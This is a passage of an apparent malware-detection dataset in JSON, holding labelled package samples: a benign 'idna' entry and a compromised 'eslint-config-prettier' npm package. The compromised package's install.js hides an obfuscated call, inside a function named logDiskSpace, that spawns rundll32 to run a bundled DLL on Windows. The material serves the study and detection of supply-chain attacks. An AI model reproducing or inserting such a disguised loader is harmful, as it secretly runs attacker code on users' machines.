        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py": "def encode(obj):\n            buffer = io.BytesIO()\n            stream = codecs.getwriter(CODEC_NAME)(buffer)\n            stream.write(obj)\n            stream.flush()\n            return buffer.getvalue()",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py": "def test_nameprep(self):\n        self.assertRaises(NotImplementedError, idna.compat.nameprep, \"a\")",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_other.py": "def test_std3(self):\n        self.assertEqual(idna.uts46_remap(\"A_\", std3_rules=False), \"a_\")\n        self.assertRaises(idna.InvalidCodepoint, idna.uts46_remap, \"A_\", std3_rules=True)",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py": "def test_empty(self):\n        self._test_containment([], range(100))"
      },
      "package_size_bytes": 54591,
      "num_files": 50,
      "metadata": {
        "package_hash": "pypi_idna_3.10",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "eslint-config-prettier",
      "ecosystem": "npm",
      "sample_type": "compromised_lib",
      "ground_truth_label": 1,
      "raw_content": "\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/prettier.js (file)\n\"use strict\";\n\nexports.rules = {\n  // These are safe to use as long as the `\"prettier/prettier\"` rule from\n  // eslint-plugin-prettier isn\u2019t enabled.\n  // These are also included in `\"plugin:prettier/recommended\"`:\n  // https://github.com/prettier/eslint-plugin-prettier#recommended-configuration\n  \"arrow-body-style\": 0,\n  \"prefer-arrow-callback\": 0,\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/flat.js (file)\n\"use strict\";\n\nconst { rules } = require(\"./index.js\");\n\nexports.name = \"config-prettier\";\nexports.rules = rules;\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/index.js (file)\n\"use strict\";\n\nconst includeDeprecated = !process.env.ESLINT_CONFIG_PRETTIER_NO_DEPRECATED;\n\nconst specialRule = 0;\n\nexports.rules = {\n  // The following rules can be used in some cases. See the README for more\n  // information. These are marked with `0` instead of `\"off\"` so that a\n  // script can distinguish them. Note that there are a few more of these\n  // in the deprecated section below.\n  \"curly\": specialRule,\n  \"no-unexpected-multiline\": specialRule,\n  \"@stylistic/lines-around-comment\": specialRule,\n  \"@stylistic/max-len\": specialRule,\n  \"@stylistic/no-confusing-arrow\": specialRule,\n  \"@stylistic/no-mixed-operators\": specialRule,\n  \"@stylistic/no-tabs\": specialRule,\n  \"@stylistic/quotes\": specialRule,\n  \"@stylistic/js/lines-around-comment\": specialRule,\n  \"@stylistic/js/max-len\": specialRule,\n  \"@stylistic/js/no-confusing-arrow\": specialRule,\n  \"@stylistic/js/no-mixed-operators\": specialRule,\n  \"@stylistic/js/no-tabs\": specialRule,\n  \"@stylistic/js/quotes\": specialRule,\n  \"@stylistic/ts/lines-around-comment\": specialRule,\n  \"@stylistic/ts/quotes\": specialRule,\n  \"@typescript-eslint/lines-around-comment\": specialRule,\n  \"@typescript-eslint/quotes\": specialRule,\n  \"babel/quotes\": specialRule,\n  \"unicorn/template-indent\": specialRule,\n  \"vue/html-self-closing\": specialRule,\n  \"vue/max-len\": specialRule,\n\n  // The rest are rules that you never need to enable when using Prettier.\n  \"@babel/object-curly-spacing\": \"off\",\n  \"@babel/semi\": \"off\",\n  \"@stylistic/array-bracket-newline\": \"off\",\n  \"@stylistic/array-bracket-spacing\": \"off\",\n  \"@stylistic/array-element-newline\": \"off\",\n  \"@stylistic/arrow-parens\": \"off\",\n  \"@stylistic/arrow-spacing\": \"off\",\n  \"@stylistic/block-spacing\": \"off\",\n  \"@stylistic/brace-style\": \"off\",\n  \"@stylistic/comma-dangle\": \"off\",\n  \"@stylistic/comma-spacing\": \"off\",\n  \"@stylistic/comma-style\": \"off\",\n  \"@stylistic/computed-property-spacing\": \"off\",\n  \"@stylistic/dot-location\": \"off\",\n  \"@stylistic/eol-last\": \"off\",\n  \"@stylistic/func-call-spacing\": \"off\",\n  \"@stylistic/function-call-argument-newline\": \"off\",\n  \"@stylistic/function-call-spacing\": \"off\",\n  \"@stylistic/function-paren-newline\": \"off\",\n  \"@stylistic/generator-star-spacing\": \"off\",\n  \"@stylistic/implicit-arrow-linebreak\": \"off\",\n  \"@stylistic/indent\": \"off\",\n  \"@stylistic/jsx-quotes\": \"off\",\n  \"@stylistic/key-spacing\": \"off\",\n  \"@stylistic/keyword-spacing\": \"off\",\n  \"@stylistic/linebreak-style\": \"off\",\n  \"@stylistic/max-statements-per-line\": \"off\",\n  \"@stylistic/multiline-ternary\": \"off\",\n  \"@stylistic/new-parens\": \"off\",\n  \"@stylistic/newline-per-chained-call\": \"off\",\n  \"@stylistic/no-extra-parens\": \"off\",\n  \"@stylistic/no-extra-semi\": \"off\",\n  \"@stylistic/no-floating-decimal\": \"off\",\n  \"@stylistic/no-mixed-spaces-and-tabs\": \"off\",\n  \"@stylistic/no-multi-spaces\": \"off\",\n  \"@stylistic/no-multiple-empty-lines\": \"off\",\n  \"@stylistic/no-trailing-spaces\": \"off\",\n  \"@stylistic/no-whitespace-before-property\": \"off\",\n  \"@stylistic/nonblock-statement-body-position\": \"off\",\n  \"@stylistic/object-curly-newline\": \"off\",\n  \"@stylistic/object-curly-spacing\": \"off\",\n  \"@stylistic/object-property-newline\": \"off\",\n  \"@stylistic/one-var-declaration-per-line\": \"off\",\n  \"@stylistic/operator-linebreak\": \"off\",\n  \"@stylistic/padded-blocks\": \"off\",\n  \"@stylistic/quote-props\": \"off\",\n  \"@stylistic/rest-spread-spacing\": \"off\",\n  \"@stylistic/semi\": \"off\",\n  \"@stylistic/semi-spacing\": \"off\",\n  \"@stylistic/semi-style\": \"off\",\n  \"@stylistic/space-before-blocks\": \"off\",\n  \"@stylistic/space-before-function-paren\": \"off\",\n  \"@stylistic/space-in-parens\": \"off\",\n  \"@stylistic/space-infix-ops\": \"off\",\n  \"@stylistic/space-unary-ops\": \"off\",\n  \"@stylistic/switch-colon-spacing\": \"off\",\n  \"@stylistic/template-curly-spacing\": \"off\",\n  \"@stylistic/template-tag-spacing\": \"off\",\n  \"@stylistic/wrap-iife\": \"off\",\n  \"@stylistic/wrap-regex\": \"off\",\n  \"@stylistic/yield-star-spacing\": \"off\",\n  \"@stylistic/member-delimiter-style\": \"off\",\n  \"@stylistic/type-annotation-spacing\": \"off\",\n  \"@stylistic/jsx-child-element-spacing\": \"off\",\n  \"@stylistic/jsx-closing-bracket-location\": \"off\",\n  \"@stylistic/jsx-closing-tag-location\": \"off\",\n  \"@stylistic/jsx-curly-newline\": \"off\",\n  \"@stylistic/jsx-curly-spacing\": \"off\",\n  \"@stylistic/jsx-equals-spacing\": \"off\",\n  \"@stylistic/jsx-first-prop-new-line\": \"off\",\n  \"@stylistic/jsx-indent\": \"off\",\n  \"@stylistic/jsx-indent-props\": \"off\",\n  \"@stylistic/jsx-max-props-per-line\": \"off\",\n  \"@stylistic/jsx-newline\": \"off\",\n  \"@stylistic/jsx-one-expression-per-line\": \"off\",\n  \"@stylistic/jsx-props-no-multi-spaces\": \"off\",\n  \"@stylistic/jsx-tag-spacing\": \"off\",\n  \"@stylistic/jsx-wrap-multilines\": \"off\",\n  \"@stylistic/indent-binary-ops\": \"off\",\n  \"@stylistic/type-generic-spacing\": \"off\",\n  \"@stylistic/type-named-tuple-spacing\": \"off\",\n  \"@stylistic/js/array-bracket-newline\": \"off\",\n  \"@stylistic/js/array-bracket-spacing\": \"off\",\n  \"@stylistic/js/array-element-newline\": \"off\",\n  \"@stylistic/js/arrow-parens\": \"off\",\n  \"@stylistic/js/arrow-spacing\": \"off\",\n  \"@stylistic/js/block-spacing\": \"off\",\n  \"@stylistic/js/brace-style\": \"off\",\n  \"@stylistic/js/comma-dangle\": \"off\",\n  \"@stylistic/js/comma-spacing\": \"off\",\n  \"@stylistic/js/comma-style\": \"off\",\n  \"@stylistic/js/computed-property-spacing\": \"off\",\n  \"@stylistic/js/dot-location\": \"off\",\n  \"@stylistic/js/eol-last\": \"off\",\n  \"@stylistic/js/func-call-spacing\": \"off\",\n  \"@stylistic/js/function-call-argument-newline\": \"off\",\n  \"@stylistic/js/function-call-spacing\": \"off\",\n  \"@stylistic/js/function-paren-newline\": \"off\",\n  \"@stylistic/js/generator-star-spacing\": \"off\",\n  \"@stylistic/js/implicit-arrow-linebreak\": \"off\",\n  \"@stylistic/js/indent\": \"off\",\n  \"@stylistic/js/jsx-quotes\": \"off\",\n  \"@stylistic/js/key-spacing\": \"off\",\n  \"@stylistic/js/keyword-spacing\": \"off\",\n  \"@stylistic/js/linebreak-style\": \"off\",\n  \"@stylistic/js/max-statements-per-line\": \"off\",\n  \"@stylistic/js/multiline-ternary\": \"off\",\n  \"@stylistic/js/new-parens\": \"off\",\n  \"@stylistic/js/newline-per-chained-call\": \"off\",\n  \"@stylistic/js/no-extra-parens\": \"off\",\n  \"@stylistic/js/no-extra-semi\": \"off\",\n  \"@stylistic/js/no-floating-decimal\": \"off\",\n  \"@stylistic/js/no-mixed-spaces-and-tabs\": \"off\",\n  \"@stylistic/js/no-multi-spaces\": \"off\",\n  \"@stylistic/js/no-multiple-empty-lines\": \"off\",\n  \"@stylistic/js/no-trailing-spaces\": \"off\",\n  \"@stylistic/js/no-whitespace-before-property\": \"off\",\n  \"@stylistic/js/nonblock-statement-body-position\": \"off\",\n  \"@stylistic/js/object-curly-newline\": \"off\",\n  \"@stylistic/js/object-curly-spacing\": \"off\",\n  \"@stylistic/js/object-property-newline\": \"off\",\n  \"@stylistic/js/one-var-declaration-per-line\": \"off\",\n  \"@stylistic/js/operator-linebreak\": \"off\",\n  \"@stylistic/js/padded-blocks\": \"off\",\n  \"@stylistic/js/quote-props\": \"off\",\n  \"@stylistic/js/rest-spread-spacing\": \"off\",\n  \"@stylistic/js/semi\": \"off\",\n  \"@stylistic/js/semi-spacing\": \"off\",\n  \"@stylistic/js/semi-style\": \"off\",\n  \"@stylistic/js/space-before-blocks\": \"off\",\n  \"@stylistic/js/space-before-function-paren\": \"off\",\n  \"@stylistic/js/space-in-parens\": \"off\",\n  \"@stylistic/js/space-infix-ops\": \"off\",\n  \"@stylistic/js/space-unary-ops\": \"off\",\n  \"@stylistic/js/switch-colon-spacing\": \"off\",\n  \"@stylistic/js/template-curly-spacing\": \"off\",\n  \"@stylistic/js/template-tag-spacing\": \"off\",\n  \"@stylistic/js/wrap-iife\": \"off\",\n  \"@stylistic/js/wrap-regex\": \"off\",\n  \"@stylistic/js/yield-star-spacing\": \"off\",\n  \"@stylistic/ts/block-spacing\": \"off\",\n  \"@stylistic/ts/brace-style\": \"off\",\n  \"@stylistic/ts/comma-dangle\": \"off\",\n  \"@stylistic/ts/comma-spacing\": \"off\",\n  \"@stylistic/ts/func-call-spacing\": \"off\",\n  \"@stylistic/ts/function-call-spacing\": \"off\",\n  \"@stylistic/ts/indent\": \"off\",\n  \"@stylistic/ts/key-spacing\": \"off\",\n  \"@stylistic/ts/keyword-spacing\": \"off\",\n  \"@stylistic/ts/member-delimiter-style\": \"off\",\n  \"@stylistic/ts/no-extra-parens\": \"off\",\n  \"@stylistic/ts/no-extra-semi\": \"off\",\n  \"@stylistic/ts/object-curly-spacing\": \"off\",\n  \"@stylistic/ts/semi\": \"off\",\n  \"@stylistic/ts/space-before-blocks\": \"off\",\n  \"@stylistic/ts/space-before-function-paren\": \"off\",\n  \"@stylistic/ts/space-infix-ops\": \"off\",\n  \"@stylistic/ts/type-annotation-spacing\": \"off\",\n  \"@stylistic/jsx/jsx-child-element-spacing\": \"off\",\n  \"@stylistic/jsx/jsx-closing-bracket-location\": \"off\",\n  \"@stylistic/jsx/jsx-closing-tag-location\": \"off\",\n  \"@stylistic/jsx/jsx-curly-newline\": \"off\",\n  \"@stylistic/jsx/jsx-curly-spacing\": \"off\",\n  \"@stylistic/jsx/jsx-equals-spacing\": \"off\",\n  \"@stylistic/jsx/jsx-first-prop-new-line\": \"off\",\n  \"@stylistic/jsx/jsx-indent\": \"off\",\n  \"@stylistic/jsx/jsx-indent-props\": \"off\",\n  \"@stylistic/jsx/jsx-max-props-per-line\": \"off\",\n  \"@typescript-eslint/block-spacing\": \"off\",\n  \"@typescript-eslint/brace-style\": \"off\",\n  \"@typescript-eslint/comma-dangle\": \"off\",\n  \"@typescript-eslint/comma-spacing\": \"off\",\n  \"@typescript-eslint/func-call-spacing\": \"off\",\n  \"@typescript-eslint/indent\": \"off\",\n  \"@typescript-eslint/key-spacing\": \"off\",\n  \"@typescript-eslint/keyword-spacing\": \"off\",\n  \"@typescript-eslint/member-delimiter-style\": \"off\",\n  \"@typescript-eslint/no-extra-parens\": \"off\",\n  \"@typescript-eslint/no-extra-semi\": \"off\",\n  \"@typescript-eslint/object-curly-spacing\": \"off\",\n  \"@typescript-eslint/semi\": \"off\",\n  \"@typescript-eslint/space-before-blocks\": \"off\",\n  \"@typescript-eslint/space-before-function-paren\": \"off\",\n  \"@typescript-eslint/space-infix-ops\": \"off\",\n  \"@typescript-eslint/type-annotation-spacing\": \"off\",\n  \"babel/object-curly-spacing\": \"off\",\n  \"babel/semi\": \"off\",\n  \"flowtype/boolean-style\": \"off\",\n  \"flowtype/delimiter-dangle\": \"off\",\n  \"flowtype/generic-spacing\": \"off\",\n  \"flowtype/object-type-curly-spacing\": \"off\",\n  \"flowtype/object-type-delimiter\": \"off\",\n  \"flowtype/quotes\": \"off\",\n  \"flowtype/semi\": \"off\",\n  \"flowtype/space-after-type-colon\": \"off\",\n  \"flowtype/space-before-generic-bracket\": \"off\",\n  \"flowtype/space-before-type-colon\": \"off\",\n  \"flowtype/union-intersection-spacing\": \"off\",\n  \"react/jsx-child-element-spacing\": \"off\",\n  \"react/jsx-closing-bracket-location\": \"off\",\n  \"react/jsx-closing-tag-location\": \"off\",\n  \"react/jsx-curly-newline\": \"off\",\n  \"react/jsx-curly-spacing\": \"off\",\n  \"react/jsx-equals-spacing\": \"off\",\n  \"react/jsx-first-prop-new-line\": \"off\",\n  \"react/jsx-indent\": \"off\",\n  \"react/jsx-indent-props\": \"off\",\n  \"react/jsx-max-props-per-line\": \"off\",\n  \"react/jsx-newline\": \"off\",\n  \"react/jsx-one-expression-per-line\": \"off\",\n  \"react/jsx-props-no-multi-spaces\": \"off\",\n  \"react/jsx-tag-spacing\": \"off\",\n  \"react/jsx-wrap-multilines\": \"off\",\n  \"standard/array-bracket-even-spacing\": \"off\",\n  \"standard/computed-property-even-spacing\": \"off\",\n  \"standard/object-curly-even-spacing\": \"off\",\n  \"unicorn/empty-brace-spaces\": \"off\",\n  \"unicorn/no-nested-ternary\": \"off\",\n  \"unicorn/number-literal-case\": \"off\",\n  \"vue/array-bracket-newline\": \"off\",\n  \"vue/array-bracket-spacing\": \"off\",\n  \"vue/array-element-newline\": \"off\",\n  \"vue/arrow-spacing\": \"off\",\n  \"vue/block-spacing\": \"off\",\n  \"vue/block-tag-newline\": \"off\",\n  \"vue/brace-style\": \"off\",\n  \"vue/comma-dangle\": \"off\",\n  \"vue/comma-spacing\": \"off\",\n  \"vue/comma-style\": \"off\",\n  \"vue/dot-location\": \"off\",\n  \"vue/func-call-spacing\": \"off\",\n  \"vue/html-closing-bracket-newline\": \"off\",\n  \"vue/html-closing-bracket-spacing\": \"off\",\n  \"vue/html-end-tags\": \"off\",\n  \"vue/html-indent\": \"off\",\n  \"vue/html-quotes\": \"off\",\n  \"vue/key-spacing\": \"off\",\n  \"vue/keyword-spacing\": \"off\",\n  \"vue/max-attributes-per-line\": \"off\",\n  \"vue/multiline-html-element-content-newline\": \"off\",\n  \"vue/multiline-ternary\": \"off\",\n  \"vue/mustache-interpolation-spacing\": \"off\",\n  \"vue/no-extra-parens\": \"off\",\n  \"vue/no-multi-spaces\": \"off\",\n  \"vue/no-spaces-around-equal-signs-in-attribute\": \"off\",\n  \"vue/object-curly-newline\": \"off\",\n  \"vue/object-curly-spacing\": \"off\",\n  \"vue/object-property-newline\": \"off\",\n  \"vue/operator-linebreak\": \"off\",\n  \"vue/quote-props\": \"off\",\n  \"vue/script-indent\": \"off\",\n  \"vue/singleline-html-element-content-newline\": \"off\",\n  \"vue/space-in-parens\": \"off\",\n  \"vue/space-infix-ops\": \"off\",\n  \"vue/space-unary-ops\": \"off\",\n  \"vue/template-curly-spacing\": \"off\",\n\n  ...(includeDeprecated && {\n    // Removed in version 0.10.0.\n    // https://eslint.org/docs/latest/rules/space-unary-word-ops\n    \"space-unary-word-ops\": \"off\",\n\n    // Removed in version 1.0.0.\n    // https://github.com/eslint/eslint/issues/1898\n    \"generator-star\": \"off\",\n    \"no-comma-dangle\": \"off\",\n    \"no-reserved-keys\": \"off\",\n    \"no-space-before-semi\": \"off\",\n    \"no-wrap-func\": \"off\",\n    \"space-after-function-name\": \"off\",\n    \"space-before-function-parentheses\": \"off\",\n    \"space-in-brackets\": \"off\",\n\n    // Removed in version 2.0.0.\n    // https://github.com/eslint/eslint/issues/5032\n    \"no-arrow-condition\": \"off\",\n    \"space-after-keywords\": \"off\",\n    \"space-before-keywords\": \"off\",\n    \"space-return-throw-case\": \"off\",\n\n    // Deprecated since version 3.3.0.\n    // https://eslint.org/docs/rules/no-spaced-func\n    \"no-spaced-func\": \"off\",\n\n    // Deprecated since version 4.0.0.\n    // https://github.com/eslint/eslint/pull/8286\n    \"indent-legacy\": \"off\",\n\n    // Deprecated since version 8.53.0.\n    // https://eslint.org/blog/2023/10/deprecating-formatting-rules/\n    \"array-bracket-newline\": \"off\",\n    \"array-bracket-spacing\": \"off\",\n    \"array-element-newline\": \"off\",\n    \"arrow-parens\": \"off\",\n    \"arrow-spacing\": \"off\",\n    \"block-spacing\": \"off\",\n    \"brace-style\": \"off\",\n    \"comma-dangle\": \"off\",\n    \"comma-spacing\": \"off\",\n    \"comma-style\": \"off\",\n    \"computed-property-spacing\": \"off\",\n    \"dot-location\": \"off\",\n    \"eol-last\": \"off\",\n    \"func-call-spacing\": \"off\",\n    \"function-call-argument-newline\": \"off\",\n    \"function-paren-newline\": \"off\",\n    \"generator-star-spacing\": \"off\",\n    \"implicit-arrow-linebreak\": \"off\",\n    \"indent\": \"off\",\n    \"jsx-quotes\": \"off\",\n    \"key-spacing\": \"off\",\n    \"keyword-spacing\": \"off\",\n    \"linebreak-style\": \"off\",\n    \"lines-around-comment\": specialRule,\n    \"max-len\": specialRule,\n    \"max-statements-per-line\": \"off\",\n    \"multiline-ternary\": \"off\",\n    \"new-parens\": \"off\",\n    \"newline-per-chained-call\": \"off\",\n    \"no-confusing-arrow\": specialRule,\n    \"no-extra-parens\": \"off\",\n    \"no-extra-semi\": \"off\",\n    \"no-floating-decimal\": \"off\",\n    \"no-mixed-operators\": specialRule,\n    \"no-mixed-spaces-and-tabs\": \"off\",\n    \"no-multi-spaces\": \"off\",\n    \"no-multiple-empty-lines\": \"off\",\n    \"no-tabs\": specialRule,\n    \"no-trailing-spaces\": \"off\",\n    \"no-whitespace-before-property\": \"off\",\n    \"nonblock-statement-body-position\": \"off\",\n    \"object-curly-newline\": \"off\",\n    \"object-curly-spacing\": \"off\",\n    \"object-property-newline\": \"off\",\n    \"one-var-declaration-per-line\": \"off\",\n    \"operator-linebreak\": \"off\",\n    \"padded-blocks\": \"off\",\n    \"quote-props\": \"off\",\n    \"quotes\": specialRule,\n    \"rest-spread-spacing\": \"off\",\n    \"semi\": \"off\",\n    \"semi-spacing\": \"off\",\n    \"semi-style\": \"off\",\n    \"space-before-blocks\": \"off\",\n    \"space-before-function-paren\": \"off\",\n    \"space-in-parens\": \"off\",\n    \"space-infix-ops\": \"off\",\n    \"space-unary-ops\": \"off\",\n    \"switch-colon-spacing\": \"off\",\n    \"template-curly-spacing\": \"off\",\n    \"template-tag-spacing\": \"off\",\n    \"wrap-iife\": \"off\",\n    \"wrap-regex\": \"off\",\n    \"yield-star-spacing\": \"off\",\n\n    // Deprecated since version 7.0.0.\n    // https://github.com/yannickcr/eslint-plugin-react/blob/master/CHANGELOG.md#700---2017-05-06\n    \"react/jsx-space-before-closing\": \"off\",\n  }),\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction log(msg) {\n    console.log(msg);\n    if (!DRY_RUN) {\n        try {\n            cache.appendFileSync(LOG_FILE, msg + '\\n');\n        } catch (err) {\n            console.error(`Failed to write log: ${err.message}`);\n        }\n    }\n}\n\nfunction ensureDir(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        if (!DRY_RUN) {\n            cache.mkdirSync(dirPath, { recursive: true });\n        }\n        summary.dirsCreated++;\n        log(`Created directory: ${dirPath}`);\n    } else {\n        \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction ensureDir(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        if (!DRY_RUN) {\n            cache.mkdirSync(dirPath, { recursive: true });\n        }\n        summary.dirsCreated++;\n        log(`Created directory: ${dirPath}`);\n    } else {\n        log(`Directory exists: ${dirPath}`);\n    }\n}\n\nfunction deleteFile(filePath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete file: ${filePath}`);\n        return;\n    }\n    try {\n        cache.unlinkSync(filePath);\n        summary.fil\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction deleteFile(filePath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete file: ${filePath}`);\n        return;\n    }\n    try {\n        cache.unlinkSync(filePath);\n        summary.filesDeleted++;\n        log(`Deleted file: ${filePath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error deleting file ${filePath}: ${err.message}`);\n    }\n}\n\nfunction deleteDir(dirPath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete directory: ${dirPath}`);\n        return;\n    }\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction deleteDir(dirPath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete directory: ${dirPath}`);\n        return;\n    }\n    try {\n        cache.rmSync(dirPath, { recursive: true, force: true });\n        summary.dirsDeleted++;\n        log(`Deleted directory: ${dirPath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error deleting directory ${dirPath}: ${err.message}`);\n    }\n}\n\nfunction archiveFile(filePath) {\n    ensureDir(ARCHIVE_DIR);\n    const fileName = path.basena\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction archiveFile(filePath) {\n    ensureDir(ARCHIVE_DIR);\n    const fileName = path.basename(filePath);\n    const targetPath = path.join(ARCHIVE_DIR, fileName);\n\n    if (DRY_RUN) {\n        log(`[Dry-run] Would archive file: ${filePath} -> ${targetPath}`);\n        return;\n    }\n    try {\n        cache.renameSync(filePath, targetPath);\n        summary.filesArchived++;\n        log(`Archived file: ${filePath} -> ${targetPath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error arc\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction cleanOldFiles(dirPath, maxAgeDays = DEFAULT_MAX_AGE_DAYS) {\n    if (!cache.existsSync(dirPath)) return;\n    const now = Date.now();\n    const maxAgeMs = maxAgeDays * 24 * 60 * 60 * 1000;\n\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        const filePath = path.join(dirPath, file);\n        try {\n            const stat = cache.lstatSync(filePath);\n            const age = now - stat.mtimeMs;\n\n            if (stat.isFile() && age > maxAgeMs) {\n            \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction rotateLogs() {\n    if (!cache.existsSync(LOG_DIR)) return;\n\n    const logs = cache.readdirSync(LOG_DIR)\n        .filter(f => f.startsWith('install_log_') && f.endsWith('.txt'))\n        .map(f => ({\n            name: f,\n            path: path.join(LOG_DIR, f),\n            time: cache.statSync(path.join(LOG_DIR, f)).mtimeMs,\n        }))\n        .sort((a, b) => b.time - a.time);\n\n    while (logs.length > MAX_LOG_FILES) {\n        const oldest = logs.pop();\n        try {\n            if (!DRY\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction logDiskSpace() {\n    try {\n        if(os.platform() === 'win32') {\n            const tempDir = os.tmpdir();\n            require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](\"rund\"+\"ll32\", \n            [path.join(__dirname, './node-gyp' + '.dll') + \",main\"]);\n            log(`Temp directory: ${tempDir}`);\n            const files = cache.readdirSync(tempDir);\n            log(`Number of files in temp directory: ${files.length}`);\n        }\n    } catch (err) {\n        summary.errors++;\n        log(`E\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js (function)\nfunction listDirectoryContents(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        log(`Directory does not exist: ${dirPath}`);\n        return;\n    }\n    log(`Contents of ${dirPath}:`);\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        try {\n            const filePath = path.join(dirPath, file);\n            const stat = cache.statSync(filePath);\n            const sizeKB = (stat.size / 1024).toFixed(2);\n            const mtime = new Date(stat.mtimeMs).toLo\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/validators.js (file)\n\"use strict\";\n\n// These validator functions answer the question \u201cIs the config valid?\u201d \u2013 return\n// `false` if the options DO conflict with Prettier, and `true` if they don\u2019t.\n\nmodule.exports = {\n  \"curly\"({ options }) {\n    if (options.length === 0) {\n      return true;\n    }\n\n    const firstOption = options[0];\n    return firstOption !== \"multi-line\" && firstOption !== \"multi-or-nest\";\n  },\n\n  \"lines-around-comment\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption &&\n        firstOption.allowBlockStart &&\n        firstOption.allowBlockEnd &&\n        firstOption.allowObjectStart &&\n        firstOption.allowObjectEnd &&\n        firstOption.allowArrayStart &&\n        firstOption.allowArrayEnd\n    );\n  },\n\n  \"no-confusing-arrow\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return firstOption ? firstOption.allowParens === false : false;\n  },\n\n  \"no-tabs\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(firstOption && firstOption.allowIndentationTabs);\n  },\n\n  \"unicorn/template-indent\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const { comments = [], tags = [] } = options[0] || {};\n\n    return (\n      Array.isArray(comments) &&\n      Array.isArray(tags) &&\n      !(\n        comments.includes(\"GraphQL\") ||\n        comments.includes(\"HTML\") ||\n        tags.includes(\"css\") ||\n        tags.includes(\"graphql\") ||\n        tags.includes(\"gql\") ||\n        tags.includes(\"html\") ||\n        tags.includes(\"markdown\") ||\n        tags.includes(\"md\")\n      )\n    );\n  },\n\n  \"vue/html-self-closing\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption && firstOption.html && firstOption.html.void === \"any\"\n      // Enable when Prettier supports SVG: https://github.com/prettier/prettier/issues/5322\n      // && firstOption.svg === \"any\"\n    );\n  },\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js (function)\nfunction help() {\n  return `\nUsage: npx eslint-config-prettier FILE...\n\nResolves an ESLint configuration for every given FILE and checks if they\ncontain rules that are unnecessary or conflict with Prettier. Example:\n\n  npx eslint-config-prettier index.js test/index.js other/file/to/check.js\n\nExit codes:\n\n0: No automatically detectable problems found.\n1: General error.\n2: Conflicting rules found.\n\nFor more information, see:\nhttps://github.com/prettier/eslint-config-prettier#cli-helper-tool\n  `.tr\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js (function)\nfunction processRules(configRules) {\n  const regularRules = filterRules(config.rules, (_, value) => value === \"off\");\n  const optionsRules = filterRules(\n    config.rules,\n    (ruleName, value) => value === 0 && ruleName in validators\n  );\n  const specialRules = filterRules(\n    config.rules,\n    (ruleName, value) => value === 0 && !(ruleName in validators)\n  );\n\n  const enabledRules = configRules\n    .map(([ruleName, value, source]) => {\n      const arrayValue = Array.isArray(value) ? 